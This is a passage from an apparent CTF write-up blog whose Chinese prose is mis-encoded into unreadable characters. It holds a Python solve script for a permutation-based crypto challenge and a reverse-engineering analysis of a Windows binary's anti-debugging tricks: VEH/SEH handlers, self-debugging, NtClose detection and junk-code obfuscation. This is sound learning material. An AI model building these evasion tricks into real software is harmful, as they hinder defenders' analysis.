class="number">25</span>, <span class="number">66</span>, <span class="number">143</span>, <span class="number">107</span>, <span class="number">195</span>, <span class="number">80</span>, <span class="number">196</span>, <span class="number">254</span>, <span class="number">174</span>, <span class="number">33</span>, <span class="number">162</span>, <span class="number">252</span>, <span class="number">141</span>, <span class="number">153</span>, <span class="number">43</span>, <span class="number">185</span>, <span class="number">211</span>, <span class="number">220</span>, <span class="number">115</span>, <span class="number">127</span>, <span class="number">216</span>, <span class="number">251</span>, <span class="number">139</span>, <span class="number">95</span>, <span class="number">146</span>, <span class="number">48</span>, <span class="number">239</span>, <span class="number">241</span>, <span class="number">37</span>, <span class="number">199</span>, <span class="number">13</span>, <span class="number">160</span>, <span class="number">90</span>, <span class="number">223</span>, <span class="number">123</span>, <span class="number">181</span>, <span class="number">120</span>, <span class="number">164</span>, <span class="number">118</span>, <span class="number">112</span>, <span class="number">128</span>, <span class="number">192</span>, <span class="number">249</span>, <span class="number">39</span>, <span class="number">2</span>, <span class="number">207</span>, <span class="number">71</span>, <span class="number">182</span>, <span class="number">145</span>, <span class="number">62</span>, <span class="number">3</span>, <span class="number">92</span>, <span class="number">183</span>, <span class="number">194</span>, <span class="number">100</span>, <span class="number">24</span>, <span class="number">133</span>, <span class="number">10</span>, <span class="number">117</span>, <span class="number">234</span>, <span class="number">29</span>, <span class="number">11</span>, <span class="number">140</span>, <span class="number">166</span>, <span class="number">85</span>, <span class="number">224</span>, <span class="number">230</span>, <span class="number">134</span>, <span class="number">189</span>, <span class="number">63</span>, <span class="number">46</span>, <span class="number">58</span>, <span class="number">231</span>, <span class="number">247</span>, <span class="number">47</span>, <span class="number">154</span>, <span class="number">44</span>, <span class="number">77</span>, <span class="number">89</span>, <span class="number">101</span>, <span class="number">69</span>, <span class="number">40</span>, <span class="number">26</span>, <span class="number">243</span>, <span class="number">253</span>, <span class="number">41</span>, <span class="number">51</span>, <span class="number">105</span>, <span class="number">155</span>, <span class="number">138</span>, <span class="number">1</span>, <span class="number">212</span>, <span class="number">20</span>, <span class="number">203</span>, <span class="number">213</span>, <span class="number">198</span>, <span class="number">158</span>, <span class="number">88</span>, <span class="number">109</span>, <span class="number">34</span>, <span class="number">119</span>, <span class="number">221</span>, <span class="number">113</span>, <span class="number">96</span>, <span class="number">204</span>, <span class="number">7</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(P2)):		</span><br><span class="line">    P2[i] -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_Chain</span>(<span class="params">P2</span>):</span><br><span class="line">	Chain = []</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(P2)):			</span><br><span class="line">		head = i</span><br><span class="line">		chain = [head]</span><br><span class="line">		c = P2[head]</span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(P2)):		</span><br><span class="line">			chain.append(c)</span><br><span class="line">			c = P2[c]</span><br><span class="line">			<span class="keyword">if</span> c == head:				</span><br><span class="line">				<span class="keyword">if</span> chain <span class="keyword">not</span> <span class="keyword">in</span> Chain:	</span><br><span class="line">					lag = <span class="number">1</span></span><br><span class="line">					<span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Chain)):		</span><br><span class="line">						<span class="keyword">for</span> l <span class="keyword">in</span> chain:				</span><br><span class="line">							<span class="keyword">if</span> l <span class="keyword">in</span> Chain[k]:</span><br><span class="line">								lag = <span class="number">0</span></span><br><span class="line">								<span class="keyword">break</span></span><br><span class="line">					<span class="keyword">if</span> lag == <span class="number">1</span>:</span><br><span class="line">						<span class="keyword">if</span> <span class="built_in">len</span>(chain) == <span class="number">2</span>:			</span><br><span class="line">							Chain.append(chain[:-<span class="number">1</span>])</span><br><span class="line">							<span class="keyword">break</span></span><br><span class="line">						<span class="keyword">else</span>:</span><br><span class="line">							Chain.append(chain)</span><br><span class="line">							<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">return</span> Chain</span><br><span class="line"></span><br><span class="line">Chain = find_Chain(P2)</span><br><span class="line"><span class="built_in">print</span>(Chain)</span><br><span class="line">LEN = []</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> Chain:</span><br><span class="line">    LEN.append(<span class="built_in">len</span>(line))</span><br><span class="line"></span><br><span class="line">LEN = <span class="built_in">sorted</span>(LEN)[::-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(LEN)</span><br><span class="line"></span><br><span class="line">chain64_1 = [<span class="number">0</span>, <span class="number">81</span>, <span class="number">136</span>, <span class="number">63</span>, <span class="number">11</span>, <span class="number">151</span>, <span class="number">65</span>, <span class="number">237</span>, <span class="number">104</span>, <span class="number">227</span>, <span class="number">76</span>, <span class="number">244</span>, <span class="number">212</span>, <span class="number">139</span>, <span class="number">201</span>, <span class="number">91</span>, <span class="number">15</span>, <span class="number">135</span>, <span class="number">20</span>, <span class="number">224</span>, <span class="number">46</span>, <span class="number">164</span>, <span class="number">42</span>, <span class="number">74</span>, <span class="number">167</span>, <span class="number">219</span>, <span class="number">62</span>, <span class="number">189</span>, <span class="number">111</span>, <span class="number">241</span>, <span class="number">211</span>, <span class="number">10</span>, <span class="number">170</span>, <span class="number">215</span>, <span class="number">223</span>, <span class="number">246</span>, <span class="number">157</span>, <span class="number">253</span>, <span class="number">95</span>, <span class="number">80</span>, <span class="number">207</span>, <span class="number">9</span>, <span class="number">146</span>, <span class="number">249</span>, <span class="number">33</span>, <span class="number">78</span>, <span class="number">60</span>, <span class="number">72</span>, <span class="number">67</span>, <span class="number">156</span>, <span class="number">195</span>, <span class="number">206</span>, <span class="number">132</span>, <span class="number">97</span>, <span class="number">44</span>, <span class="number">134</span>, <span class="number">98</span>, <span class="number">90</span>, <span class="number">69</span>, <span class="number">130</span>, <span class="number">51</span>, <span class="number">58</span>, <span class="number">177</span>, <span class="number">240</span>]</span><br><span class="line">chain64_2 = [<span class="number">1</span>, <span class="number">236</span>, <span class="number">50</span>, <span class="number">172</span>, <span class="number">138</span>, <span class="number">14</span>, <span class="number">169</span>, <span class="number">126</span>, <span class="number">245</span>, <span class="number">197</span>, <span class="number">181</span>, <span class="number">159</span>, <span class="number">32</span>, <span class="number">55</span>, <span class="number">141</span>, <span class="number">54</span>, <span class="number">30</span>, <span class="number">221</span>, <span class="number">57</span>, <span class="number">226</span>, <span class="number">43</span>, <span class="number">37</span>, <span class="number">26</span>, <span class="number">254</span>, <span class="number">203</span>, <span class="number">193</span>, <span class="number">38</span>, <span class="number">71</span>, <span class="number">27</span>, <span class="number">59</span>, <span class="number">225</span>, <span class="number">153</span>, <span class="number">106</span>, <span class="number">149</span>, <span class="number">214</span>, <span class="number">84</span>, <span class="number">110</span>, <span class="number">129</span>, <span class="number">239</span>, <span class="number">137</span>, <span class="number">216</span>, <span class="number">229</span>, <span class="number">100</span>, <span class="number">150</span>, <span class="number">24</span>, <span class="number">73</span>, <span class="number">235</span>, <span class="number">40</span>, <span class="number">200</span>, <span class="number">2</span>, <span class="number">31</span>, <span class="number">120</span>, <span class="number">178</span>, <span class="number">36</span>, <span class="number">86</span>, <span class="number">160</span>, <span class="number">161</span>, <span class="number">251</span>, <span class="number">220</span>, <span class="number">45</span>, <span class="number">176</span>, <span class="number">238</span>, <span class="number">154</span>, <span class="number">194</span>]</span><br><span class="line">chain29_1 = [<span class="number">4</span>, <span class="number">29</span>, <span class="number">131</span>, <span class="number">143</span>, <span class="number">64</span>, <span class="number">102</span>, <span class="number">147</span>, <span class="number">77</span>, <span class="number">92</span>, <span class="number">109</span>, <span class="number">34</span>, <span class="number">56</span>, <span class="number">162</span>, <span class="number">140</span>, <span class="number">205</span>, <span class="number">23</span>, <span class="number">124</span>, <span class="number">96</span>, <span class="number">232</span>, <span class="number">25</span>, <span class="number">13</span>, <span class="number">18</span>, <span class="number">123</span>, <span class="number">234</span>, <span class="number">252</span>, <span class="number">112</span>, <span class="number">125</span>, <span class="number">83</span>, <span class="number">93</span>]</span><br><span class="line">chain29_2 = [<span class="number">7</span>, <span class="number">113</span>, <span class="number">155</span>, <span class="number">79</span>, <span class="number">121</span>, <span class="number">204</span>, <span class="number">99</span>, <span class="number">187</span>, <span class="number">163</span>, <span class="number">152</span>, <span class="number">142</span>, <span class="number">243</span>, <span class="number">202</span>, <span class="number">182</span>, <span class="number">89</span>, <span class="number">174</span>, <span class="number">145</span>, <span class="number">52</span>, <span class="number">209</span>, <span class="number">233</span>, <span class="number">242</span>, <span class="number">19</span>, <span class="number">158</span>, <span class="number">173</span>, <span class="number">94</span>, <span class="number">217</span>, <span class="number">133</span>, <span class="number">85</span>, <span class="number">17</span>]</span><br><span class="line">chain20_1 = [<span class="number">3</span>, <span class="number">82</span>, <span class="number">48</span>, <span class="number">16</span>, <span class="number">185</span>, <span class="number">180</span>, <span class="number">12</span>, <span class="number">192</span>, <span class="number">248</span>, <span class="number">108</span>, <span class="number">166</span>, <span class="number">210</span>, <span class="number">28</span>, <span class="number">186</span>, <span class="number">119</span>, <span class="number">213</span>, <span class="number">165</span>, <span class="number">184</span>, <span class="number">122</span>, <span class="number">8</span>]</span><br><span class="line">chain20_2 = [<span class="number">5</span>, <span class="number">199</span>, <span class="number">61</span>, <span class="number">255</span>, <span class="number">6</span>, <span class="number">115</span>, <span class="number">168</span>, <span class="number">114</span>, <span class="number">41</span>, <span class="number">190</span>, <span class="number">127</span>, <span class="number">35</span>, <span class="number">228</span>, <span class="number">88</span>, <span class="number">53</span>, <span class="number">107</span>, <span class="number">175</span>, <span class="number">47</span>, <span class="number">148</span>, <span class="number">21</span>]</span><br><span class="line">chain9_1 = [<span class="number">39</span>, <span class="number">196</span>, <span class="number">70</span>, <span class="number">66</span>, <span class="number">128</span>, <span class="number">75</span>, <span class="number">208</span>, <span class="number">116</span>, <span class="number">231</span>]</span><br><span class="line">chain9_2 = [<span class="number">68</span>, <span class="number">218</span>, <span class="number">188</span>, <span class="number">117</span>, <span class="number">101</span>, <span class="number">103</span>, <span class="number">183</span>, <span class="number">222</span>, <span class="number">230</span>]</span><br><span class="line">chain4_1 = [<span class="number">22</span>, <span class="number">179</span>, <span class="number">198</span>, <span class="number">144</span>]</span><br><span class="line">chain4_2 = [<span class="number">49</span>, <span class="number">171</span>, <span class="number">250</span>, <span class="number">118</span>]</span><br><span class="line">chain3 = [<span class="number">87</span>, <span class="number">105</span>, <span class="number">247</span>]</span><br><span class="line">chain1 = [<span class="number">191</span>]</span><br><span class="line"></span><br><span class="line">dictionary = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">singlering</span>(<span class="params">chain</span>):</span><br><span class="line">    new = [<span class="number">0</span>]*<span class="built_in">len</span>(chain)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(chain)):</span><br><span class="line">        new[i*<span class="number">2</span>%<span class="built_in">len</span>(chain)] = chain[i]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(chain)):</span><br><span class="line">        dictionary[new[i]] = new[(i+<span class="number">1</span>)%<span class="built_in">len</span>(chain)] <span class="comment"># map</span></span><br><span class="line"></span><br><span class="line">singlering(chain1)</span><br><span class="line">singlering(chain3)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¤§å¾ªç¯åµŒå¥—</span></span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">for</span> i1 <span class="keyword">in</span> trange(<span class="number">64</span>):									</span><br><span class="line">    ring_128 = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>)]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">        <span class="keyword">if</span>(j%<span class="number">2</span> == <span class="number">0</span>):</span><br><span class="line">            ring_128[j] = chain64_1[j//<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ring_128[j] = chain64_2[(j//<span class="number">2</span>+i1)%<span class="number">64</span>]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">        dictionary[ring_128[j]] = ring_128[(j+<span class="number">1</span>)%<span class="number">128</span>]	</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span> i2 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">29</span>):								</span><br><span class="line">        ring_58 = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">58</span>)]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">58</span>):</span><br><span class="line">            <span class="keyword">if</span>(j%<span class="number">2</span>==<span class="number">0</span>):</span><br><span class="line">                ring_58[j] = chain29_1[j//<span class="number">2</span>]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                ring_58[j] = chain29_2[(j//<span class="number">2</span>+i2)%<span class="number">29</span>]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">58</span>):</span><br><span class="line">            dictionary[ring_58[j]] = ring_58[(j+<span class="number">1</span>)%<span class="number">58</span>]	</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i3 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):							</span><br><span class="line">            ring_40 = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>)]</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">                <span class="keyword">if</span>(j%<span class="number">2</span> == <span class="number">0</span>):</span><br><span class="line">                    ring_40[j] = chain20_1[j//<span class="number">2</span>]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    ring_40[j] = chain20_2[(j//<span class="number">2</span>+i3)%<span class="number">20</span>]</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">                dictionary[ring_40[j]] = ring_40[(j+<span class="number">1</span>)%<span class="number">40</span>]	</span><br><span class="line">                </span><br><span class="line">            <span class="keyword">for</span> i4 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):								</span><br><span class="line">                ring_18 = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>)]</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>):</span><br><span class="line">                    <span class="keyword">if</span>(j%<span class="number">2</span> == <span class="number">0</span>):</span><br><span class="line">                        ring_18[j] = chain9_1[j//<span class="number">2</span>]</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        ring_18[j] = chain9_2[(j//<span class="number">2</span> + i4)%<span class="number">9</span>]</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>):</span><br><span class="line">                    dictionary[ring_18[j]] = ring_18[(j+<span class="number">1</span>)%<span class="number">18</span>]	</span><br><span class="line">                    		</span><br><span class="line">                <span class="keyword">for</span> i5 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):								</span><br><span class="line">                    ring_8 = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)]</span><br><span class="line">                    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">                        <span class="keyword">if</span>(j%<span class="number">2</span> == <span class="number">0</span>):</span><br><span class="line">                            ring_8[j] = chain4_1[j//<span class="number">2</span>]</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            ring_8[j] = chain4_2[(j//<span class="number">2</span>+i5)%<span class="number">4</span>]</span><br><span class="line">                    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">                        dictionary[ring_8[j]] = ring_8[(j+<span class="number">1</span>)%<span class="number">8</span>]</span><br><span class="line">                        </span><br><span class="line">                    M = [dictionary[j]+<span class="number">1</span> <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)]</span><br><span class="line">                    mask = P(M)</span><br><span class="line">                    mul = P(mul)</span><br><span class="line">                    _<span class="built_in">hash</span> = sha512(<span class="built_in">str</span>(mask).encode()).hexdigest()</span><br><span class="line">                    mask_hash = <span class="string">&quot;91881f508f08fbafec1a6879fc3a1f215135c94c78f03fae8534d54dc05bd4a122a4e4508d32b9e02be08fbbb42a9e3335fc433c20e2da2e012d11b7324f6952&quot;</span></span><br><span class="line">                    <span class="keyword">if</span> _<span class="built_in">hash</span> == mask_hash:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&quot;P= <span class="subst">&#123;mask&#125;</span>&quot;</span>)</span><br><span class="line">                        temp = sha512(<span class="built_in">str</span>(mask * mul).encode()).hexdigest()</span><br><span class="line">                        <span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line">                        flag = msg ^ <span class="built_in">int</span>(temp,<span class="number">16</span>)</span><br><span class="line">                        <span class="built_in">print</span>(n2s(<span class="built_in">int</span>(flag)))</span><br></pre></td></tr></table></figure>
<p>è¿™é¢˜å†™çš„æ—¶å€™å‡ºäº†å¥½å¤šbugâ€¦ ä»¥åæœ‰ç©ºå†è‡ªå·±å†™ä¸€é</p>
<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="WHERE"><a href="#WHERE" class="headerlink" title="WHERE"></a>WHERE</h2><p>æŒºå¥½çš„é¢˜çš„ åªæ˜¯ä¸ºä»€ä¹ˆæˆ‘çš„ <code>byte_41C0A0</code> æ€ä¹ˆéƒ½æ‰¾ä¸åˆ°å€¼å•Šâ€¦<br>é™¤å¼€è¿™ç‚¹(å°±æ˜¯å¾—ä¸åˆ°flagç½¢äº†) è¿˜æ˜¯æœ‰äº›çŸ¥è¯†ç‚¹å€¼å¾—è®°å½•ä¸‹çš„<br>è€ƒç‚¹: èŠ±æŒ‡ä»¤ å¼‚å¸¸å¤„ç†<br>VEHå’ŒSEHçš„åŒºåˆ«ï¼š SEHæ˜¯åŸºäºçº¿ç¨‹çš„ è€Œ VEHæ˜¯åŸºäºè¿›ç¨‹çš„</p>
<p>IDAæ‰“å¼€<br>mainå¼€å¤´å°±æœ‰ä¸ª<br><code>ExceptionList = NtCurrentTeb()-&gt;NtTib.ExceptionList;</code><br>ç»§ç»­åˆ†æmain</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddVectoredExceptionHandler = (PVOID (__stdcall *)(ULONG, PVECTORED_EXCEPTION_HANDLER))GetProcAddress(</span><br><span class="line">                                                                                         hModule,</span><br><span class="line">                                                                                         &quot;AddVectoredExceptionHandler&quot;);</span><br><span class="line">AddVectoredExceptionHandler(0, Handler);</span><br><span class="line">if ( !sub_401350(ExceptionList, &amp;loc_401660) )</span><br><span class="line">&#123;</span><br><span class="line">  sub_401520();</span><br><span class="line">  ExitProcess(0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œadd VEH åè¿›è¡Œäº†è°ƒè¯•æ£€æµ‹ æœ‰ä¸ªå¾ˆæœ‰è¶£çš„ç‚¹:<br>sub_401520ç‚¹è¿›å»æ˜¯è¿™æ ·çš„ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">BOOL <span class="title function_">sub_401520</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  BOOL result; <span class="comment">// eax</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">DEBUG_EVENT</span> <span class="title">DebugEvent</span>;</span> <span class="comment">// [esp+4Ch] [ebp-4B8h] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">STARTUPINFOA</span> <span class="title">StartupInfo</span>;</span> <span class="comment">// [esp+B0h] [ebp-454h] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">PROCESS_INFORMATION</span> <span class="title">ProcessInformation</span>;</span> <span class="comment">// [esp+F4h] [ebp-410h] BYREF</span></span><br><span class="line">  CHAR Filename[<span class="number">1024</span>]; <span class="comment">// [esp+104h] [ebp-400h] BYREF</span></span><br><span class="line"></span><br><span class="line">  StartupInfo.cb = <span class="number">68</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;StartupInfo.lpReserved, <span class="number">0</span>, <span class="number">0x40</span>u);</span><br><span class="line">  GetModuleFileNameA(<span class="number">0</span>, Filename, <span class="number">0x400</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !CreateProcessA(Filename, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1u</span>, <span class="number">0</span>, <span class="number">0</span>, &amp;StartupInfo, &amp;ProcessInformation) )</span><br><span class="line">    sub_4013C0(<span class="number">404</span>);</span><br><span class="line">  sub_4013C0(<span class="number">2</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;DebugEvent, <span class="number">0</span>, <span class="keyword">sizeof</span>(DebugEvent));</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = WaitForDebugEvent(&amp;DebugEvent, <span class="number">0xFFFFFFFF</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !result )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ContinueDebugEvent(DebugEvent.dwProcessId, DebugEvent.dwThreadId, dwContinueStatus);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ä¹Ÿå°±æ˜¯å¦‚æœæˆ‘ä»¬æ²¡æœ‰è°ƒè¯•çš„è¯å®ƒå°±è‡ªå·±å¯åŠ¨äº†ä¸€ä¸ªè‡ªè°ƒè¯•<br>ç»§ç»­çœ‹<br>é¦–å…ˆè¦è¾“å…¥ä¸€ä¸ªv15 è¿›è¡Œäº†ä¸€ç³»åˆ—çº¦æŸcheck å¾ˆå®¹æ˜“çˆ†ç ´å‡ºflag1&#x3D;20220222<br>æ¥ä¸‹æ¥è¾“å…¥Str checké•¿åº¦ä¸º32å è§¦å‘äº†ä¸€ä¸ªå¼‚å¸¸</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXCEPTION_ACCESS_VIOLATION         0xC0000005     </span><br><span class="line">ç¨‹åºä¼å›¾è¯»å†™ä¸€ä¸ªä¸å¯è®¿é—®çš„åœ°å€æ—¶å¼•å‘çš„å¼‚å¸¸ã€‚ä¾‹å¦‚ä¼å›¾è¯»å–0åœ°å€å¤„çš„å†…å­˜</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œçš„å¼‚å¸¸ä¼šè¢«VEHå¤„ç†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LONG __stdcall Handler(struct _EXCEPTION_POINTERS *ExceptionInfo)</span><br><span class="line">&#123;</span><br><span class="line">  size_t v1; // eax</span><br><span class="line">  DWORD Value; // [esp+50h] [ebp-508h]</span><br><span class="line">  char v4[256]; // [esp+54h] [ebp-504h] BYREF</span><br><span class="line">  char *Source; // [esp+154h] [ebp-404h]</span><br><span class="line">  char Destination[256]; // [esp+158h] [ebp-400h] BYREF</span><br><span class="line">  char Str[256]; // [esp+258h] [ebp-300h] BYREF</span><br><span class="line">  char v8[256]; // [esp+358h] [ebp-200h] BYREF</span><br><span class="line">  char v9[256]; // [esp+458h] [ebp-100h] BYREF</span><br><span class="line"></span><br><span class="line">  memset(v9, 0, sizeof(v9));</span><br><span class="line">  memset(v8, 0, sizeof(v8));</span><br><span class="line">  memset(Str, 0, sizeof(Str));</span><br><span class="line">  memset(v4, 0, sizeof(v4));</span><br><span class="line">  Source = (char *)ExceptionInfo-&gt;ContextRecord-&gt;Edx;</span><br><span class="line">  Value = ExceptionInfo-&gt;ContextRecord-&gt;Eax;</span><br><span class="line">  if ( ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode != 0xC0000005 )</span><br><span class="line">    return 0;</span><br><span class="line">  strcpy(Destination, Source);</span><br><span class="line">  _itoa(Value, Str, 8);</span><br><span class="line">  v1 = strlen(Str);</span><br><span class="line">  sub_401080(v9, v8, Str, v1);</span><br><span class="line">  sub_4010F0(v9, v8);</span><br><span class="line">  sub_4011A0(v9, Str, 256);</span><br><span class="line">  sub_4012A0(Str, Destination, Source, 32);</span><br><span class="line">  ExceptionInfo-&gt;ContextRecord-&gt;Eip += 6;</span><br><span class="line">  return -1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œçœ‹åˆ°Sourceæ¥è‡ªedxæŒ‡å‘çš„å€¼<br>è€Œè¿™é‡Œå¯ä»¥çœ‹åˆ° edxç¡®å®æŒ‡å‘äº†Str</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00401D6F                 lea     ecx, [ebp+Str]</span><br><span class="line">.text:00401D75                 mov     [ebp+var_8], ecx</span><br><span class="line">.text:00401D78                 mov     edx, [ebp+var_8]</span><br><span class="line">.text:00401D7B                 mov     eax, [ebp+var_14]</span><br></pre></td></tr></table></figure>
<p>è¿™ä¸€æ®µç‚¹è¿›å»æŸ¥çœ‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">v1 = strlen(Str);</span><br><span class="line">  sub_401080(v9, v8, Str, v1);</span><br><span class="line">  sub_4010F0(v9, v8);</span><br><span class="line">  sub_4011A0(v9, Str, 256);</span><br><span class="line">  sub_4012A0(Str, Destination, Source, 32);</span><br></pre></td></tr></table></figure>
<p>ä¼šå‘ç°æ˜¯ä¸ªRC4åŠ äº†ä¸€ç‚¹xor<br>å¤„ç†å®Œå¼‚å¸¸å å‘ç°ä¸‹é¢åˆæœ‰ä¸€å¥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NtClose = (NTSTATUS (__stdcall *)(HANDLE))GetProcAddress(::hModule, &quot;NtClose&quot;);</span><br></pre></td></tr></table></figure>
<p>è¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢?<br>æ–°çŸ¥è¯†:</p>
<ul>
<li>è°ƒç”¨NtClose ä¼šé‡Šæ”¾ä¸€ä¸ªæ— æ•ˆå¥æŸ„ å¦‚æœæ²¡æœ‰è¢«è°ƒè¯•è¿”å›FALSE å¦åˆ™æŠ›å‡ºå¼‚å¸¸ 0xC0000008</li>
</ul>
<p>è¿™å°±æ˜¯ä¸ºä»€ä¹ˆå‰é¢è¦å¯åŠ¨è‡ªè°ƒè¯• å°±æ˜¯ä¸ºäº†åœ¨è¿™é‡ŒæŠ›å‡ºå¼‚å¸¸ è¢«SEHæ•è·<br>è½¬åˆ°å¼€å¤´SEHçš„åœ°æ–¹<br>ç»†å¿ƒæŸ¥çœ‹è¿™é‡Œä¼šå‘ç°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00401B2C                 rep stosd</span><br><span class="line">.text:00401B2E                 lea     eax, loc_401660</span><br><span class="line">.text:00401B34                 push    eax</span><br><span class="line">.text:00401B35                 mov     eax, large fs:0</span><br><span class="line">.text:00401B3B                 push    eax</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œè°ƒç”¨äº†loc_401660<br>ç‚¹å‡»è·³è½¬ä¼šå‘ç°è¿™æ˜¯ä¸€ä¸ªåŠ äº†èŠ±æŒ‡ä»¤çš„å‡½æ•° æ²¡æœ‰è¢«IDAæ­£å¸¸è¯†åˆ«<br>è§‚å¯Ÿå‘ç°æœ‰ junk code </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00401678                 jz      short near ptr loc_40167C+1</span><br><span class="line">.text:0040167A                 jnz     short near ptr loc_40167C+1</span><br><span class="line">.text:0040167C</span><br><span class="line">.text:0040167C loc_40167C:                             ; CODE XREF: .text:00401678â†‘j</span><br><span class="line">.text:0040167C                                         ; .text:0040167Aâ†‘j</span><br><span class="line">.text:0040167C                 call    near ptr 13C5C48h</span><br><span class="line">.text:0040167C ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401681                 db 3 dup(0)</span><br></pre></td></tr></table></figure>
<p>å…¨éƒ¨nopæ‰ Cä¸€C Pä¸€På°±èƒ½F5äº†</p>
